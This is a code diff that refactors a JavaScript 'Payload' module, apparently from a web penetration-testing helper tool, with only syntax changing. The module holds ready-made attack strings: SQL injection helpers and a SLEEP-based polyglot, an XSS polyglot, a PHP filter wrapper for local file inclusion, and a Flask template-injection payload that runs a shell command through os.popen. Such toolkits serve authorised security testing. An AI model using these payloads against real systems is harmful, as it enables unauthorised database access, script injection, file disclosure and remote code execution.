@@ -1,13 +1,9 @@
 window.Payload = {}
 
 window.Payload.SQLi = {
-  spaceToComment: (value) => {
-    return value.replace(/[^\S\r\n]+/g, '/**/')
-  },
+  spaceToComment: value => value.replace(/[^\S\r\n]+/g, '/**/'),
 
-  polyglot: (value) => {
-    return "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
-  },
+  polyglot: value => "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
 
   MySQL: {
     unionSelect: ({ columns, position }) => {
@@ -131,19 +127,15 @@ window.Payload.SQLi = {
 }
 
 window.Payload.XSS = {
-  polyglot: (value) => {
-    return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
-  }
+  polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
 }
 
 window.Payload.LFI = {
-  phpWrapperBas64: (value) => {
-    return 'php://filter/convert.base64-encode/resource=' + value
-  }
+  phpWrapperBas64: value => 'php://filter/convert.base64-encode/resource=' + value
 }
 
 window.Payload.SSTI = {
-  flaskRCE: (value) => {
+  flaskRCE: value => {
     // Reference: https://twitter.com/realgam3/status/1184747565415358469
     return "{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}"
   }
